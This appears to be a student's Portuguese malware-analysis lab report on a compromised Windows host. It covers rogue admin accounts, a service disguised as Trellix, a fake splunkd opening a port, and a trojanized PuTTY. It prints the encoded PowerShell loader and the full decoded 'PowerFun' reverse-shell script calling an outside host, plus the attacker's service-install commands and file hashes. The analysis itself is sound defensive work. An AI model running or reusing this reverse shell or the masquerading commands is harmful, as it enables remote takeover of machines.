*Daniel Maia - CISEG 0325*
# Análise das baselines
Ambas as baselines + o current-state estão disponíveis no Zip encriptado.
Aqui está o que achei mais importante
## Users
É possivel observar 2 novos users criados (provavelmente pelos atacantes):
- telmo
- ramires
Ambos fazem parte do grupo `Administrators`
## Scheduled Tasks
Tem uma Task do `trellix.exe`, que assumo que tenha sido criada pelo serviço do mesmo
## Services
Existe um serviço do `nssm.exe` que corre o `trellix.exe`, tirando isso, nada fora do comum 

# Findings
## nssm.exe
"The non-sucking service manager" que foi utilzado para instalar o serviço malicioso do `trellix.exe`. 
Localização do executável:
```
C:\Windows\cu\nssm.exe
```
![[Pasted image 20251124115642.png]]

### Serviço
![[Pasted image 20251124120426.png]]
## trellix.exe
Localização do executável:
```
C:\Windows\Temp\trellix.exe
```
![[Pasted image 20251124120705.png]]
*E também tá nos Downloads, mas assumo que teha sido deixado quando a máquina foi preparada*
### ScheduledTask
![[Pasted image 20251124120334.png]]
### etc
Analisando o Procmon, acho que é possivel ver que o `trellix.exe` está a efetuar alguem tipo de comunicação para fora
![[Pasted image 20251124130601.png]]
## splunkd.exe
Localização do executável:
```
C:\Users\admin\AppData\Local\Temp\splunkd.exe
```
![[Pasted image 20251124120303.png]]
Ele vai criar uma regra na firewall para deixar passar tudo (any any) e vai se meter em listening na porta 4445
![[Pasted image 20251124123838.png]]
### Netstat
![[Pasted image 20251124123643.png]]
### TCPView
![[Pasted image 20251124131807.png]]
## putty.exe (SillyPutty)
O executável tá no desktop
```
C:\Users\admin\Desktop\putty.exe
```
Após abir o executável, uma janela da powershell abre durante uns segundos
Analisando com o ProcExplorer, é possivel observar o script que é corrido em powershell:
```
powershell.exe -nop -w hidden -noni -ep bypass "&([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String('H4sIAOW/UWECA51W227jNhB991cMXHUtIRbhdbdAESCLepVsGyDdNVZu82AYCE2NYzUyqZKUL0j87yUlypLjBNtUL7aGczlz5kL9AGOxQbkoOIRwK1OtkcN8B5/Mz6SQHCW8g0u6RvidymTX6RhNplPB4TfU4S3OWZYi19B57IB5vA2DC/iCm/Dr/G9kGsLJLscvdIVGqInRj0r9Wpn8qfASF7TIdCQxMScpzZRx4WlZ4EFrLMV2R55pGHlLUut29g3EvE6t8wjl+ZhKuvKr/9NYy5Tfz7xIrFaUJ/1jaawyJvgz4aXY8EzQpJQGzqcUDJUCR8BKJEWGFuCvfgCVSroAvw4DIf4D3XnKk25QHlZ2pW2WKkO/ofzChNyZ/ytiWYsFe0CtyITlN05j9suHDz+dGhKlqdQ2rotcnroSXbT0Roxhro3Dqhx+BWX/GlyJa5QKTxEfXLdK/hLyaOwCdeeCF2pImJC5kFRj+U7zPEsZtUUjmWA06/Ztgg5Vp2JWaYl0ZdOoohLTgXEpM/Ab4FXhKty2ibquTi3USmVx7ewV4MgKMww7Eteqvovf9xam27DvP3oT430PIVUwPbL5hiuhMUKp04XNCv+iWZqU2UU0y+aUPcyC4AU4ZFTope1nazRSb6QsaJW84arJtU3mdL7TOJ3NPPtrm3VAyHBgnqcfHwd7xzfypD72pxq3miBnIrGTcH4+iqPr68DW4JPV8bu3pqXFRlX7JF5iloEsODfaYBgqlGnrLpyBh3x9bt+4XQpnRmaKdThgYpUXujm845HIdzK9X2rwowCGg/c/wx8pk0KJhYbIUWJJgJGNaDUVSDQB1piQO37HXdc6Tohdcug32fUH/eaF3CC/18t2P9Uz3+6ok4Z6G1XTsxncGJeWG7cvyAHn27HWVp+FvKJsaTBXTiHlh33UaDWw7eMfrfGA1NlWG6/2FDxd87V4wPBqmxtuleH74GV/PKRvYqI3jqFn6lyiuBFVOwdkTPXSSHsfe/+7dJtlmqHve2k5A5X5N6SJX3V8HwZ98I7sAgg5wuCktlcWPiYTk8prV5tbHFaFlCleuZQbL2b8qYXS8ub2V0lznQ54afCsrcy2sFyeFADCekVXzocf372HJ/ha6LDyCo6KI1dDKAmpHRuSv1MC6DVOthaIh1IKOR3MjoK1UJfnhGVIpR+8hOCi/WIGf9s5naT/1D6Nm++OTrtVTgantvmcFWp5uLXdGnSXTZQJhS6f5h6Ntcjry9N8eXQOXxyH4rirE0J3L9kF8i/mtl93dQkAAA=='))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))"
```
 ![[Pasted image 20251124122635.png]]
Depois de desencriptado, dá-nos o script de Reverse Shell "PowerFun":
```
# Powerfun - Written by Ben Turner & Dave Hardy

function Get-Webclient 
{
    $wc = New-Object -TypeName Net.WebClient
    $wc.UseDefaultCredentials = $true
    $wc.Proxy.Credentials = $wc.Credentials
    $wc
}
function powerfun 
{ 
    Param( 
    [String]$Command,
    [String]$Sslcon,
    [String]$Download
    ) 
    Process {
    $modules = @()  
    if ($Command -eq "bind")
    {
        $listener = [System.Net.Sockets.TcpListener]8443
        $listener.start()    
        $client = $listener.AcceptTcpClient()
    } 
    if ($Command -eq "reverse")
    {
        $client = New-Object System.Net.Sockets.TCPClient("bonus2.corporatebonusapplication.local",8443)
    }

    $stream = $client.GetStream()

    if ($Sslcon -eq "true") 
    {
        $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
        $sslStream.AuthenticateAsClient("bonus2.corporatebonusapplication.local") 
        $stream = $sslStream 
    }

    [byte[]]$bytes = 0..20000|%{0}
    $sendbytes = ([text.encoding]::ASCII).GetBytes("Windows PowerShell running as user " + $env:username + " on " + $env:computername + "`nCopyright (C) 2015 Microsoft Corporation. All rights reserved.`n`n")
    $stream.Write($sendbytes,0,$sendbytes.Length)

    if ($Download -eq "true")
    {
        $sendbytes = ([text.encoding]::ASCII).GetBytes("[+] Loading modules.`n")
        $stream.Write($sendbytes,0,$sendbytes.Length)
        ForEach ($module in $modules)
        {
            (Get-Webclient).DownloadString($module)|Invoke-Expression
        }
    }

    $sendbytes = ([text.encoding]::ASCII).GetBytes('PS ' + (Get-Location).Path + '>')
    $stream.Write($sendbytes,0,$sendbytes.Length)

    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
    {
        $EncodedText = New-Object -TypeName System.Text.ASCIIEncoding
        $data = $EncodedText.GetString($bytes,0, $i)
        $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String )

        $sendback2  = $sendback + 'PS ' + (Get-Location).Path + '> '
        $x = ($error[0] | Out-String)
        $error.clear()
        $sendback2 = $sendback2 + $x

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte,0,$sendbyte.Length)
        $stream.Flush()  
    }
    $client.Close()
    $listener.Stop()
    }
}

powerfun -Command reverse -Sslcon true
```
Para verificar o seu funcionamento, editei o ficheiro:
```
C:\Windows\System32\drivers\etc\hosts
```
e adicionamos uma entrada para o `bonus2.corporatebonusapplication.local` com o IP de uma máquina que vai dar listen (neste caso um kali).
O que o kali recebe vem encoded, seria provavelmente necessário um listener especifico.
## Blocked Domains/IPs
O único dominio que foi bloqueado na FW foi o `bonus2.corporatebonusapplication.local`
# Infected file hashes (MD5)
## nssm.exe
```
BECEAE2FDC4F7729A93E94AC2CCD78CC
```
## putty.exe
```
334A10500FEB0F3444BF2E86AB2E76DA
```
## splunkd.exe
```
CF134A9F264CECAA4A722D88F576D1F8
```
## trellix.exe
```
A9E6EFEA2D1E93B11301A55F53CA2F64
```
## trellix (1).exe
```
A9E6EFEA2D1E93B11301A55F53CA2F64
```
# Extras
Uma versão do trellix.exe foi deixada nos Downloads (está no zip infected como `trellix (1).exe`)
Alguns comands executados na Powershell ficaram na history (basta usar a seta para cima):
```
Set-ExecutionPolicy Unrestricted
C:\LiveAnalysis\nssm.exe install Trellix "$env:windir\trellix.exe" | Out-Null
C:\LiveAnalysis\nssm.exe set Trellix Description "Trellix Endpoint Security service" | Out-Null
C:\LiveAnalysis\nssm.exe set Trellix DisplayName "Trellix Endpoint Security" | Out-Null
Start-Service -Name Trellix | Out-Null
cd C:\LiveAnalysis
ls
cd C:\Windows\cu
.\live-investigation-teardown.ps1
.\live-investigation-setup.ps1
ps
C:\LiveAnalysis\nssm.exe install Trellix "$env:windir\trellix.exe" | Out-Null
```
